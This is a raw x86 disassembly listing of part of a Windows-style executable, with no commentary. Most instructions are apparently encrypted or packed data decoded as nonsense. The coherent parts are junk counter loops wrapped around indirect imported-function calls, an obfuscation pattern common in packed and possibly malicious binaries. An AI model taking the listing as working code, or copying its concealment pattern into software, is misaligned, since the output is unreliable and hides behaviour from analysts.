  4070d7:	xor    dl,dh
  4070d9:	iret   
  4070da:	pop    ds
  4070db:	mov    bh,0x35
  4070dd:	xchg   ebx,eax
  4070de:	jp     0x407064
  4070e0:	add    BYTE PTR [ebx],ch
  4070e2:	lds    edi,FWORD PTR [eax]
  4070e4:	cmp    eax,0x81d84589
  4070e9:	and    eax,0x43354f
  4070ee:	dec    ebp
  4070ef:	daa    
  4070f0:	add    BYTE PTR [eax],al
  4070f2:	mov    eax,DWORD PTR [ebp+0x8]
  4070f5:	mov    DWORD PTR [ebp-0x20],eax
  4070f8:	xor    ecx,ecx
  4070fa:	xor    ecx,DWORD PTR ds:0x4335f3
  407100:	add    ecx,DWORD PTR ds:0x433543
  407106:	mov    DWORD PTR ds:0x4335f3,ecx
  40710c:	jmp    0x407482
  407111:	ret    
  407112:	and    dl,dl
  407114:	paddw  mm5,mm1
  407117:	int    0xf0
  407119:	xchg   DWORD PTR [esi+0xb],edx
  40711c:	inc    DWORD PTR [edi-0x52f78]
  407122:	iret   
  407123:	jl     0x4071a1
  407125:	xlat   BYTE PTR ds:[ebx]
  407126:	jns    0x4071a4
  407128:	jl     0x4070e1
  40712a:	push   esp
  40712b:	ds sub al,0xb0
  40712e:	adc    BYTE PTR [edi-0x5d],0x45
  407132:	jmp    0x4070bc
  407134:	retf   0xebb0
  407137:	fsub   QWORD PTR [edx+0x1363dcaa]
  40713d:	push   edi
  40713e:	adc    al,0xba
  407140:	inc    ebx
  407141:	mov    ds:0xbbd6fec6,al
  407146:	nop
  407147:	xor    BYTE PTR [ecx+0x2],bl
  40714a:	inc    edi
  40714b:	mov    ecx,fs
  40714d:	mov    ecx,DWORD PTR [edi]
  40714f:	fisttp QWORD PTR [ecx+0x40867707]
  407155:	add    BYTE PTR [ecx-0xdeb874],0x65
  40715c:	xchg   edx,eax
  40715d:	fwait
  40715e:	in     al,dx
  40715f:	stc    
  407160:	sbb    BYTE PTR [edi],ch
  407162:	jp     0x4071d4
  407164:	ins    BYTE PTR es:[edi],dx
  407165:	jnp    0x4071c7
  407167:	retf   
  407168:	pop    ebx
  407169:	jbe    0x40718a
  40716b:	mov    edx,0x195e2809
  407170:	iret   
  407171:	xchg   esp,eax
  407172:	sbb    eax,0x550c5df4
  407177:	xor    BYTE PTR [ebx-0x3dad0555],cl
  40717d:	sub    DWORD PTR [eax-0x37],0x24
  407181:	add    DWORD PTR [edi-0x1628ef3e],ebp
  407187:	and    bl,cl
  407189:	cmp    al,0xaf
  40718b:	add    BYTE PTR [eax+0x6dffb043],0x87
  407192:	add    al,0xba
  407194:	in     al,dx
  407195:	sbb    esp,DWORD PTR [edx+0x75e98df7]
  40719b:	ins    DWORD PTR es:[edi],dx
  40719c:	or     eax,0x522d6fbe
  4071a1:	push   ss
  4071a2:	and    BYTE PTR fs:[edi-0x64],al
  4071a6:	sbb    eax,0x30c6bc8f
  4071ab:	inc    ecx
  4071ac:	iret   
  4071ad:	shl    ch,1
  4071af:	dec    esp
  4071b0:	imul   ecx,DWORD PTR [ecx+eiz*8+0x79],0xec9426df
  4071b8:	or     BYTE PTR [ebx+0x7e],bh
  4071bb:	pop    eax
  4071bc:	jb     0x40721e
  4071be:	arpl   sp,ax
  4071c0:	pop    esp
  4071c1:	sahf   
  4071c2:	add    al,0x7f
  4071c4:	mov    esi,0x6b3afe28
  4071c9:	dec    esp
  4071ca:	mov    esp,DWORD PTR [esi]
  4071cc:	and    edx,DWORD PTR [eax]
  4071ce:	mov    BYTE PTR [edx-0x29],cl
  4071d1:	cmp    eax,0xaad603de
  4071d6:	jno    0x407180
  4071d8:	stos   BYTE PTR es:[edi],al
  4071d9:	add    cl,BYTE PTR [eax-0x4]
  4071dc:	mov    ds:0x8f4e2e6d,eax
  4071e1:	(bad)  
  4071e2:	sub    al,0x85
  4071e4:	sbb    DWORD PTR [ecx],esi
  4071e6:	(bad)  
  4071e7:	xlat   BYTE PTR ds:[ebx]
  4071e8:	pop    ebp
  4071e9:	mov    al,0x2
  4071eb:	ins    BYTE PTR es:[edi],dx
  4071ec:	adc    eax,0x81391e9d
  4071f1:	fild   QWORD PTR es:[ebx-0x42]
  4071f5:	push   0xecf4b540
  4071fa:	and    DWORD PTR [edx+0x61a028f],0x101b6151
  407204:	xlat   BYTE PTR ds:[ebx]
  407205:	aaa    
  407206:	addr16 inc cx
  407209:	out    0x8b,al
  40720b:	int3   
  40720c:	retf   0x62ab
  40720f:	clc    
  407210:	aaa    
  407211:	and    al,0x93
  407213:	cld    
  407214:	out    0xee,eax
  407216:	xor    eax,0xaca9ef59
  40721b:	pop    ecx
  40721c:	inc    edi
  40721d:	add    DWORD PTR [ecx-0xd],edi
  407220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407221:	fdivr  QWORD PTR [esi+0x5d361d64]
  407227:	mov    WORD PTR [eax-0x5d04430c],ds
  40722d:	sub    bl,ah
  40722f:	stc    
  407230:	pop    di
  407232:	pop    esi
  407233:	inc    edi
  407234:	frstor [esi]
  407236:	sbb    eax,0x3d5d5745
  40723b:	adc    ebx,DWORD PTR [ebp+ecx*4+0x6d]
  40723f:	call   0xc2f7:0xe1663ff5
  407246:	jnp    0x4072ba
  407248:	pusha  
  407249:	mov    ecx,0xd11ab7cd
  40724e:	pop    ebp
  40724f:	xor    esi,esi
  407251:	fnstsw WORD PTR [edi+0x2fe36187]
  407257:	inc    eax
  407258:	ins    BYTE PTR es:[edi],dx
  407259:	jecxz  0x407295
  40725b:	jbe    0x407252
  40725d:	xor    DWORD PTR [ebx+0x2e],0xffffff94
  407261:	mov    eax,esp
  407263:	pop    ebp
  407264:	shl    BYTE PTR [ebx-0x4d],cl
  407267:	cli    
  407268:	push   esp
  407269:	adc    DWORD PTR [eax+0x1],edi
  40726c:	addr16 xchg ebx,eax
  40726e:	pop    esi
  40726f:	mov    dh,0x8e
  407271:	fidiv  DWORD PTR ds:0xdd9911b
  407277:	aad    0x9
  407279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40727a:	cmp    eax,DWORD PTR [ecx+0x350e0522]
  407280:	daa    
  407281:	add    al,0xed
  407283:	dec    ebx
  407284:	ret    0xa6fa
  407287:	xor    esi,DWORD PTR [eax+0x65]
  40728a:	push   DWORD PTR [esi+0x37]
  40728d:	dec    esi
  40728e:	mov    dl,0xa5
  407290:	in     eax,dx
  407291:	loop   0x4072c3
  407293:	retf   0x4deb
  407296:	rcr    BYTE PTR [esi+ebp*4-0x7c],1
  40729a:	stos   DWORD PTR es:[edi],eax
  40729b:	enter  0x655c,0x53
  40729f:	enter  0x6b22,0x41
  4072a3:	cmp    eax,0x4002a2ae
  4072a8:	into   
  4072a9:	hlt    
  4072aa:	pop    eax
  4072ab:	adc    esp,ebx
  4072ad:	nop
  4072ae:	ficom  WORD PTR [esi+eiz*8+0x30]
  4072b2:	cmp    DWORD PTR [edi+0x6a],ebp
  4072b5:	mov    bh,0xce
  4072b7:	sub    BYTE PTR ds:0xd5820dd3,al
  4072bd:	adc    al,0x34
  4072bf:	leave  
  4072c0:	int3   
  4072c1:	and    eax,0x9e08ca17
  4072c6:	imul   ebx,DWORD PTR [eax-0x30],0xffffff98
  4072ca:	push   ebp
  4072cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072cc:	xchg   ebx,eax
  4072cd:	sub    edx,DWORD PTR [esi+0x2eefd983]
  4072d3:	jecxz  0x407278
  4072d5:	or     eax,0x2015bfbb
  4072da:	push   ecx
  4072db:	jg     0x407314
  4072dd:	popf   
  4072de:	mov    dh,BYTE PTR [edi-0x3a0e12b4]
  4072e4:	inc    esp
  4072e5:	or     DWORD PTR [eax],0xa2aea458
  4072eb:	cmp    DWORD PTR [eax+0x48c2ba05],ebp
  4072f1:	shl    DWORD PTR [ebp+0x30940706],cl
  4072f7:	ret    
  4072f8:	xchg   edx,eax
  4072f9:	sub    DWORD PTR [edx-0x5a],0x1a
  4072fd:	cmp    eax,0x365e26df
  407302:	call   0x20b7:0x15d1ecbb
  407309:	lock push es
  40730b:	test   bh,al
  40730d:	sub    dl,BYTE PTR [ebx-0x35]
  407310:	imul   eax,DWORD PTR [edi+0x7c],0x66950735
  407317:	mov    ds:0xf11b5d3,eax
  40731c:	cld    
  40731d:	pop    eax
  40731e:	mov    dl,0x22
  407320:	mov    ah,0xee
  407322:	push   ecx
  407323:	call   0xece6ffe8
  407328:	pop    ds
  407329:	enter  0x5bd1,0x12
  40732d:	stos   DWORD PTR es:[edi],eax
  40732e:	mov    ah,0x1d
  407330:	sbb    BYTE PTR [eax+0x152e960],ch
  407336:	test   al,0xea
  407338:	pop    edx
  407339:	ds addr16 or edi,ebx
  40733d:	mov    bh,0x7d
  40733f:	add    BYTE PTR [eax],bl
  407341:	(bad)  
  407342:	jecxz  0x40737b
  407344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407345:	stos   DWORD PTR es:[edi],eax
  407346:	out    0x49,eax
  407348:	mov    BYTE PTR [esi+ebp*8-0x22],dh
  40734c:	shr    ecx,cl
  40734e:	xchg   edi,eax
  40734f:	sar    edx,0xdd
  407352:	cmp    ebp,DWORD PTR [ecx-0x136dadd0]
  407358:	pop    eax
  407359:	loop   0x407304
  40735b:	fcomi  st,st(7)
  40735d:	out    0x54,al
  40735f:	retf   0xbd22
  407362:	sti    
  407363:	jo     0x40739c
  407365:	mov    ch,0x51
  407367:	sbb    bl,BYTE PTR [ebx+0x58]
  40736a:	push   ss
  40736b:	je     0x4073e3
  40736d:	stos   BYTE PTR es:[edi],al
  40736e:	stc    
  40736f:	inc    esi
  407370:	scas   al,BYTE PTR es:[edi]
  407371:	sub    eax,0xe57e3ee7
  407376:	scas   al,BYTE PTR es:[edi]
  407377:	add    DWORD PTR [ebx+0x7ab7f6e8],eax
  40737d:	add    BYTE PTR [ebx-0xe],dh
  407380:	ret    
  407381:	adc    esi,DWORD PTR [ebx+edx*8+0x27de4a15]
  407388:	sbb    cl,BYTE PTR [esi]
  40738a:	int3   
  40738b:	push   es
  40738c:	mov    ebp,0x256ce9a4
  407391:	mov    edi,0x259b18e
  407396:	das    
  407397:	sbb    bl,dh
  407399:	xlat   BYTE PTR ds:[ebx]
  40739a:	sbb    al,0xa9
  40739c:	test   BYTE PTR [edx],0x27
  40739f:	inc    esp
  4073a0:	pop    es
  4073a1:	je     0x407375
  4073a3:	sti    
  4073a4:	(bad)  
  4073a5:	or     edi,DWORD PTR [ecx]
  4073a7:	push   ebx
  4073a8:	jne    0x407345
  4073aa:	xchg   esp,eax
  4073ab:	arpl   WORD PTR [eax-0x28],ax
  4073ae:	xchg   edx,eax
  4073af:	pop    es
  4073b0:	fs xchg ecx,eax
  4073b2:	not    ecx
  4073b4:	sub    DWORD PTR ds:0xeef39857,0x4dbe1976
  4073be:	mov    ch,0xba
  4073c0:	aad    0xb4
  4073c2:	add    DWORD PTR [ebx],0x3b
  4073c5:	in     eax,0x43
  4073c7:	in     al,0x2a
  4073c9:	enter  0x4318,0xa2
  4073cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073ce:	pop    ecx
  4073cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073d0:	shl    DWORD PTR ss:[ecx+0x4e],1
  4073d4:	xchg   ebp,eax
  4073d5:	aad    0x3d
  4073d7:	adc    dh,BYTE PTR [edx]
  4073d9:	push   esp
  4073da:	pop    ecx
  4073db:	pop    esi
  4073dc:	sbb    eax,0xa94d80cb
  4073e1:	push   edx
  4073e2:	push   esi
  4073e3:	sub    DWORD PTR [edi+0x5b],esi
  4073e6:	enter  0x58eb,0xf4
  4073ea:	lock bnd jp 0x4073a6
  4073ee:	mov    ah,0xec
  4073f0:	icebp  
  4073f1:	mov    ch,0x0
  4073f4:	or     al,ch
  4073f6:	add    DWORD PTR [ebx],ecx
  4073f8:	or     eax,0x35663106
  4073fd:	inc    ebp
  4073fe:	in     eax,dx
  4073ff:	jne    0x407418
  407401:	mov    cl,0x16
  407403:	xor    DWORD PTR [esi],esi
  407405:	leave  
  407406:	mov    edx,0x76eecd5c
  40740c:	cmp    al,0x76
  40740e:	mov    ebp,0xa4cf629c
  407413:	and    bh,al
  407415:	sub    edx,DWORD PTR [ebp-0x1f3329fe]
  40741b:	jl     0x407455
  40741d:	jge    0x4073f7
  40741f:	sar    DWORD PTR [ebp+0x2f],1
  407422:	sub    eax,0xa7c68361
  407427:	repnz in al,dx
  407429:	pop    ecx
  40742a:	lea    esp,[ecx]
  40742c:	in     al,dx
  40742d:	out    dx,eax
  40742e:	cmp    ecx,DWORD PTR [eax-0x60483e84]
  407434:	fstp   st(2)
  407436:	dec    esi
  407437:	pop    esi
  407438:	and    edx,DWORD PTR [edi+0x66]
  40743b:	dec    ecx
  40743c:	ins    BYTE PTR es:[edi],dx
  40743d:	sbb    al,0x4f
  40743f:	xchg   esp,eax
  407440:	inc    ebx
  407441:	inc    ebp
  407442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407443:	ror    BYTE PTR [ecx-0x3dfc7733],cl
  407449:	test   DWORD PTR [ecx-0x70d8705],0xa789d8c2
  407453:	jo     0x407488
  407455:	mov    ah,0x10
  407457:	adc    ch,BYTE PTR [esi-0x28]
  40745a:	sahf   
  40745b:	lock aad 0x98
  40745e:	xor    eax,0x165bb4bb
  407463:	ds cmp al,0x31
  407466:	shl    BYTE PTR [esp+edx*8],cl
  407469:	xchg   ebp,eax
  40746a:	shr    DWORD PTR [eax+0x3e5bb9ab],1
  407470:	cmc    
  407471:	into   
  407472:	bound  esi,QWORD PTR [esi-0x38]
  407475:	(bad)  
  407476:	rcl    al,1
  407478:	jmp    0x407457
  40747a:	arpl   cx,bp
  40747c:	test   bh,ah
  40747e:	push   edx
  40747f:	js     0x407473
  407481:	mov    bl,0x53
  407483:	mov    DWORD PTR ds:0x433597,0x17
  40748d:	cmp    DWORD PTR ds:0x433597,0x0
  407494:	je     0x4074de
  40749a:	cmp    DWORD PTR ds:0x433597,0xc
  4074a1:	jne    0x4074b2
  4074a7:	push   0x26d7
  4074ac:	call   DWORD PTR ds:0x41218c
  4074b2:	cmp    DWORD PTR ds:0x433597,0xd
  4074b9:	jne    0x4074cc
  4074bf:	mov    ecx,DWORD PTR ds:0x433597
  4074c5:	dec    ecx
  4074c6:	mov    DWORD PTR ds:0x433597,ecx
  4074cc:	mov    ecx,DWORD PTR ds:0x433597
  4074d2:	dec    ecx
  4074d3:	mov    DWORD PTR ds:0x433597,ecx
  4074d9:	jmp    0x40748d
  4074de:	lea    eax,[ebp-0x18]
  4074e1:	not    DWORD PTR ds:0x4335ab
  4074e7:	mov    DWORD PTR [ebp-0x1c],eax
  4074ea:	add    DWORD PTR ds:0x4335ab,ecx
  4074f0:	jmp    0x407866
  4074f5:	xchg   esi,eax
  4074f6:	je     0x407544
  4074f8:	cwde   
  4074f9:	outs   dx,BYTE PTR ds:[esi]
  4074fa:	mov    al,ds:0x62ca7272
  4074ff:	mov    cl,0xe2
  407501:	xchg   esi,eax
  407502:	shl    eax,cl
  407504:	mov    ss,WORD PTR [esi-0x38]
  407507:	jl     0x407585
  407509:	xlat   BYTE PTR ds:[ebx]
  40750a:	jns    0x407588
  40750c:	jl     0x4074ed
  40750e:	jb     0x407534
  407510:	jns    0x40754d
  407512:	stos   BYTE PTR es:[edi],al
  407513:	nop
  407514:	inc    ebx
  407515:	into   
  407516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407517:	retf   0x6fb2
  40751a:	mov    ebp,0xc6e99c88
  40751f:	in     al,0xd
  407521:	std    
  407522:	test   BYTE PTR [ecx-0x4d],bh
  407525:	stc    
  407526:	mov    ecx,0x86314c46
  40752b:	loop   0x407549
  40752d:	hlt    
  40752e:	xor    al,0x53
  407530:	ret    
  407531:	xor    BYTE PTR [ecx+0x35],0x64
  407535:	les    eax,FWORD PTR [ebx+ebx*1]
  407538:	inc    eax
  407539:	and    DWORD PTR [eax-0x2e575d4d],esi
  40753f:	xchg   cl,bh
  407541:	add    eax,0xdb954bc7
  407546:	ins    DWORD PTR es:[edi],dx
  407547:	cmc    
  407548:	loope  0x407540
  40754a:	test   DWORD PTR [esi],0xaa00e399
  407550:	aam    0x4a
  407552:	lea    edx,[ecx]
  407554:	adc    eax,0x6ac8037d
  407559:	outs   dx,BYTE PTR ds:[esi]
  40755a:	not    BYTE PTR [eax+0x57763e91]
  407560:	mov    ds:0x655a3448,al
  407565:	adc    dh,dh
  407567:	add    al,0x83
  407569:	mov    bl,0x80
  40756b:	mov    ds:0xd799a11e,eax
  407570:	dec    ecx
  407571:	mov    bl,0x8
  407573:	mov    fs,esp
  407575:	or     cl,BYTE PTR [eiz*2-0x7c09d9d3]
  40757c:	jo     0x407550
  40757e:	inc    ebp
  40757f:	sub    ah,dl
  407581:	sub    eax,0x1b6f54de
  407586:	push   ebp
  407588:	popa   
  407589:	aas    
  40758a:	mov    cs,eax
  40758c:	jnp    0x4075ac
  40758e:	or     BYTE PTR [eax],0xc
  407591:	push   esi
  407592:	xor    DWORD PTR [ecx+eiz*8],0xffffffd3
  407596:	xchg   esp,eax
  407597:	jne    0x4075df
  407599:	imul   esp,DWORD PTR [edi+0x1d],0xffffffa1
  40759d:	in     eax,0x3d
  40759f:	lock add bh,BYTE PTR [esi+0x78f0e45]
  4075a6:	xchg   edi,eax
  4075a7:	inc    esp
  4075a8:	mov    edi,0xefd5b921
  4075ad:	mov    ebx,0x2c17822f
  4075b2:	or     ebp,DWORD PTR [ecx]
  4075b4:	mov    edx,0x800c4624
  4075b9:	pop    edx
  4075ba:	jbe    0x40754a
  4075bc:	adc    eax,0x955dfc6e
  4075c1:	imul   esp
  4075c3:	in     eax,0x8a
  4075c5:	push   ebx
  4075c6:	adc    ecx,DWORD PTR [edx]
  4075c8:	cmp    dl,BYTE PTR [edi+0x4b]
  4075cb:	test   cl,al
  4075cd:	mov    ah,ah
  4075cf:	add    al,0x10
  4075d1:	gs popa 
  4075d3:	cmp    edi,esp
  4075d5:	test   DWORD PTR [esi+0x27],esp
  4075d8:	leave  
  4075d9:	scas   al,BYTE PTR es:[edi]
  4075da:	and    esi,DWORD PTR [edi]
  4075dc:	ja     0x407569
  4075de:	pop    ebp
  4075df:	out    dx,eax
  4075e0:	jg     0x407660
  4075e2:	add    eax,0xce1169de
  4075e7:	sub    DWORD PTR [edx+0x49dfd095],0xffffff8c
  4075ee:	aas    
  4075ef:	mov    bh,0x2a
  4075f1:	mov    ah,ch
  4075f3:	mov    ebp,0x639c097d
  4075f8:	sbb    BYTE PTR [ebx+0x6b],cl
  4075fb:	mov    edx,esi
  4075fd:	inc    ecx
  4075fe:	jae    0x40767a
  407600:	sub    BYTE PTR [esp+ebx*1],dl
  407603:	lds    eax,FWORD PTR [esi+0x5378cd9f]
  407609:	or     dh,ch
  40760b:	mov    esi,0x60658c4f
  407610:	stos   DWORD PTR es:[edi],eax
  407611:	ins    DWORD PTR es:[edi],dx
  407612:	jmp    0x4075d1
  407614:	inc    edi
  407615:	push   cs
  407616:	cmp    eax,0x812aed7a
  40761b:	sub    eax,0xe65bcec
  407620:	dec    eax
  407621:	fdivr  st,st(0)
  407623:	mov    WORD PTR [ecx-0x4f],?
  407626:	xchg   esi,eax
  407627:	mov    bh,0xc0
  407629:	dec    ecx
  40762a:	sub    DWORD PTR ds:0xae66beb2,ebp
  407630:	repz data16 hlt 
  407633:	cmc    
  407634:	retf   0xe5de
  407637:	jl     0x4075e8
  407639:	mov    ch,0x93
  40763b:	push   edi
  40763c:	add    DWORD PTR [eax+eiz*4-0x74],esi
  407640:	cmp    ebp,DWORD PTR [edi+ebx*8-0x27c17755]
  407647:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407648:	mov    esi,0x207125c7
  40764d:	scas   eax,DWORD PTR es:[edi]
  40764e:	push   0x29bbb2b5
  407653:	mov    BYTE PTR [esi+0x35],bl
  407656:	add    al,0xed
  407658:	xchg   esi,eax
  407659:	jl     0x4076bb
  40765b:	cmp    BYTE PTR [ebx],ch
  40765d:	push   edx
  40765e:	das    
  40765f:	test   DWORD PTR [ecx-0x4b06f8e5],eax
  407665:	inc    esp
  407666:	mov    BYTE PTR [edi+0x7bdfaf49],ch
  40766c:	sbb    esi,DWORD PTR [esi+0xbfda566]
  407672:	xchg   edx,eax
  407673:	pop    esi
  407674:	push   ds
  407675:	or     al,0x81
  407677:	dec    edx
  407678:	sub    ch,BYTE PTR [edi-0x75]
  40767b:	aaa    
  40767c:	into   
  40767d:	dec    eax
  40767e:	jp     0x4076eb
  407680:	rcr    ecx,1
  407682:	xor    eax,0x4e78c9ea
  407687:	test   DWORD PTR [eax*1-0x22a3542],edi
  40768e:	adc    al,0x10
  407690:	mov    edi,0x975f8282
  407695:	not    DWORD PTR ds:[ebx-0x2454c569]
  40769c:	lods   eax,DWORD PTR ds:[esi]
  40769d:	mov    ds:0x95fa49f9,al
  4076a2:	fbld   TBYTE PTR [ecx+0x4dcd5d1]
  4076a8:	aaa    
  4076a9:	in     eax,0x41
  4076ab:	inc    esi
  4076ac:	pop    ss
  4076ad:	fisub  WORD PTR [ebx-0x3]
  4076b0:	xor    eax,ebx
  4076b2:	fidivr WORD PTR [eax-0x13]
  4076b5:	mov    eax,ds:0x7d315df3
  4076ba:	or     eax,DWORD PTR [ebp-0x65ce7d70]
  4076c0:	jecxz  0x4076f2
  4076c2:	and    eax,0x11d67d28
  4076c7:	jge    0x4076a1
  4076c9:	popa   
  4076ca:	dec    edx
  4076cb:	sbb    cl,BYTE PTR [ecx+0x4f]
  4076ce:	sbb    ebx,DWORD PTR [edi]
  4076d0:	aad    0x58
  4076d2:	sbb    eax,0x83337b09
  4076d7:	(bad)  
  4076d8:	mov    ch,0x50
  4076da:	jge    0x407681
  4076dc:	hlt    
  4076dd:	sub    eax,0x53e858e
  4076e2:	pop    ebx
  4076e3:	mov    eax,eax
  4076e5:	push   eax
  4076e6:	adc    al,BYTE PTR [edx-0x3882678a]
  4076ec:	repnz jcxz 0x407766
  4076f0:	add    cl,BYTE PTR [ecx]
  4076f2:	sbb    al,0x46
  4076f4:	sbb    DWORD PTR [edi+edx*2+0x77],esp
  4076f8:	sub    cl,0x3e
  4076fb:	mov    dl,BYTE PTR [ecx-0x3d35132d]
  407701:	(bad)  
  407702:	cmp    DWORD PTR [eax],ebx
  407704:	std    
  407705:	xlat   BYTE PTR ds:[ebx]
  407706:	or     ah,ah
  407708:	jmp    0x3234:0xf34cb911
  40770f:	aam    0x6d
  407711:	shl    BYTE PTR [edx+0xd],cl
  407714:	and    ch,BYTE PTR [eax+edi*8+0x21f07d5a]
  40771b:	xor    esi,DWORD PTR [ebx+0x68]
  40771e:	pop    ebx
  40771f:	sbb    al,0xcb
  407721:	pop    ecx
  407722:	jo     0x4076e1
  407724:	adc    al,0xca
  407726:	fisttp QWORD PTR [ebx]
  407728:	leave  
  407729:	cmp    esi,eax
  40772b:	je     0x407702
  40772d:	fld    DWORD PTR [ebp-0x68b2b3af]
  407733:	push   ecx
  407734:	test   eax,0x336e232a
  407739:	mov    ebx,0xfe86f656
  40773e:	jmp    ebx
  407740:	or     al,0x37
  407742:	mov    esi,0x7c0f9b47
  407747:	jecxz  0x407760
  407749:	push   ebp
  40774a:	add    DWORD PTR [ebx],ebp
  40774c:	idiv   esi
  40774e:	push   ss
  40774f:	push   0xfffffff5
  407751:	ss add eax,0x53f81576
  407757:	or     eax,0x789a9f60
  40775c:	xchg   esp,eax
  40775d:	repnz cwde 
  40775f:	sub    al,0xc7
  407761:	into   
  407762:	enter  0xdd9c,0x3e
  407766:	loopne 0x4077b4
  407768:	stc    
  407769:	xor    cl,0x22
  40776c:	cwde   
  40776d:	xor    BYTE PTR [ecx-0x4a680bec],dh
  407773:	fcom   DWORD PTR [esi]
  407775:	sub    eax,DWORD PTR [ecx-0x35b47241]
  40777b:	ja     0x4077e9
  40777d:	pop    ebp
  40777e:	lea    ecx,[eax+0x42]
  407781:	pop    es
  407782:	cdq    
  407783:	rol    al,0x80
  407786:	imul   edi,DWORD PTR [ebx+0x2d],0x2baffde8
  40778d:	mov    bh,0x29
  40778f:	jmp    0xd9cf:0xd92d91ba
  407796:	mov    esp,0x836add83
  40779b:	jl     0x4077f0
  40779d:	hlt    
  40779e:	fcom   QWORD PTR [ecx+0x50e58c21]
  4077a4:	add    al,0xd1
  4077a6:	mov    bh,BYTE PTR [esp+esi*8]
  4077a9:	and    edi,edx
  4077ab:	bound  edx,QWORD PTR [ecx-0x6f03b230]
  4077b1:	jge    0x4077af
  4077b3:	fwait
  4077b4:	dec    ebp
  4077b5:	dec    esp
  4077b6:	xor    al,0xb8
  4077b8:	jl     0x4077cf
  4077ba:	pop    edi
  4077bb:	mov    eax,0xf8ddc61b
  4077c0:	ror    DWORD PTR [edi-0x48],1
  4077c3:	call   0xc05c:0xac01c41e
  4077ca:	popw   ds
  4077cc:	fwait
  4077cd:	cmp    eax,0xe8b44e23
  4077d2:	sub    bl,dl
  4077d4:	and    bl,BYTE PTR [eax+0x36]
  4077d7:	call   DWORD PTR [esi]
  4077d9:	sub    esp,eax
  4077db:	fs in  al,0x97
  4077de:	jb     0x407825
  4077e0:	gs inc ebx
  4077e2:	sar    DWORD PTR [esi-0x1b],0x67
  4077e6:	inc    esi
  4077e7:	ins    DWORD PTR es:[edi],dx
  4077e8:	cmp    BYTE PTR [eax+0x156631e6],ch
  4077ee:	push   ecx
  4077ef:	loop   0x4077d8
  4077f1:	xor    eax,0x7893e779
  4077f6:	add    eax,0x4555e623
  4077fb:	frstor [edx+0x50]
  4077fe:	xor    edi,esp
  407800:	xchg   edx,eax
  407801:	xchg   edx,eax
  407802:	inc    esi
  407803:	ss inc edi
  407805:	jae    0x4077d0
  407807:	mov    eax,gs
  407809:	jge    0x4077a6
  40780b:	sbb    eax,edx
  40780d:	imul   esp,edi,0x41
  407810:	pop    edx
  407811:	nop
  407812:	test   eax,0xa2089bf0
  407817:	push   eax
  407818:	sbb    eax,0xb631af9b
  40781d:	mov    bh,0x4a
  40781f:	imul   ch
  407821:	lea    ecx,[ecx-0x54]
  407824:	jnp    0x4077ac
  407826:	je     0x4077f0
  407828:	das    
  407829:	jle    0x40789d
  40782b:	sub    ebx,DWORD PTR [ecx]
  40782d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40782e:	scas   eax,DWORD PTR es:[edi]
  40782f:	push   0xffffffd4
  407831:	gs (bad) 
  407833:	mov    eax,0x5f651c28
  407838:	pop    ss
  407839:	stos   BYTE PTR es:[edi],al
  40783a:	sbb    eax,0x4ab7ac8f
  40783f:	mov    ebp,0xa05ca726
  407844:	add    BYTE PTR [esp+edi*1-0x638fc4ea],dl
  40784b:	mov    eax,ds:0x86bd53e2
  407850:	ins    BYTE PTR es:[edi],dx
  407851:	and    cl,BYTE PTR [esi+0x4020485f]
  407857:	jmp    0x7bbb4805
  40785c:	add    al,BYTE PTR [ecx]
  40785e:	call   DWORD PTR [ecx]
  407860:	sub    edi,DWORD PTR [ebp+0x73]
  407863:	and    esi,DWORD PTR [edi]
  407865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407866:	mov    eax,DWORD PTR [ebp-0x1c]
  407869:	and    DWORD PTR ds:0x433617,0x0
  407873:	mov    ebx,DWORD PTR ds:0x433617
  407879:	inc    ebx
  40787a:	mov    DWORD PTR ds:0x433617,ebx
  407880:	cmp    DWORD PTR ds:0x433617,0x6
  407887:	jne    0x407896
  40788d:	push   DWORD PTR [ebp-0x28]
  407890:	call   DWORD PTR ds:0x412190
  407896:	cmp    DWORD PTR ds:0x433617,0x5
  40789d:	jne    0x4078b0
  4078a3:	mov    ebx,DWORD PTR ds:0x433617
  4078a9:	inc    ebx
  4078aa:	mov    DWORD PTR ds:0x433617,ebx
  4078b0:	cmp    DWORD PTR ds:0x433617,0x15
  4078b7:	jb     0x407873
  4078bd:	push   esi
  4078be:	and    DWORD PTR ds:0x43354b,edi
  4078c4:	push   edi
  4078c5:	and    DWORD PTR ds:0x4335eb,0x0
  4078cf:	jmp    0x4078e1
  4078d4:	mov    edi,DWORD PTR ds:0x4335eb
  4078da:	inc    edi
  4078db:	mov    DWORD PTR ds:0x4335eb,edi
  4078e1:	cmp    DWORD PTR ds:0x4335eb,0x18
  4078e8:	jae    0x4079ae
  4078ee:	cmp    DWORD PTR ds:0x4335eb,0x8
  4078f5:	jne    0x407918
  4078fb:	push   0x117a
  407900:	push   DWORD PTR [ebp-0x28]
  407903:	push   0x433814
  407908:	push   0x86e1
  40790d:	push   0x5408
  407912:	call   DWORD PTR ds:0x41225c
  407918:	cmp    DWORD PTR ds:0x4335eb,0x7
  40791f:	jne    0x407934
  407925:	xor    edi,edi
  407927:	xor    edi,DWORD PTR ds:0x4335eb
  40792d:	inc    edi
  40792e:	mov    DWORD PTR ds:0x4335eb,edi
  407934:	jmp    0x4078d4
  407939:	mov    DWORD PTR ds:0x43354b,0x19
  407943:	cmp    DWORD PTR ds:0x43354b,0x0
  40794a:	je     0x4079ae
  407950:	cmp    DWORD PTR ds:0x43354b,0x9
  407957:	jne    0x40796e
  40795d:	push   DWORD PTR [ebp-0x1c]
  407960:	push   0x6ccd
  407965:	push   DWORD PTR [ebp-0x10]
  407968:	call   DWORD PTR ds:0x4120c4
  40796e:	cmp    DWORD PTR ds:0x43354b,0xa
  407975:	jne    0x407988
  40797b:	mov    edi,DWORD PTR ds:0x43354b
  407981:	dec    edi
  407982:	mov    DWORD PTR ds:0x43354b,edi
  407988:	mov    edi,DWORD PTR ds:0x43354b
  40798e:	dec    edi
  40798f:	mov    DWORD PTR ds:0x43354b,edi
  407995:	jmp    0x407943
